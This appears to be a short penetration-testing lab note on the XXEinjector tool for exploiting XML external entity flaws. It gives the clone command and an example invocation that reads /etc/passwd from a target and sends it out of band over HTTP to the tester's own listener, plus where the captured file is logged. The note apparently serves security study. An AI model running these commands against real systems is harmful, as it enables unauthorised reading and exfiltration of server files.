#xml #xxe #tool #automation

- [enjoiz/XXEinjector: Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods.](https://github.com/enjoiz/XXEinjector)
- Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods.
- `git clone https://github.com/enjoiz/XXEinjector.git`
- Save a request with the headers and the XML version then end with `XXEINJECT`
- `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`
- `cat Logs/10.129.201.94/etc/passwd.log`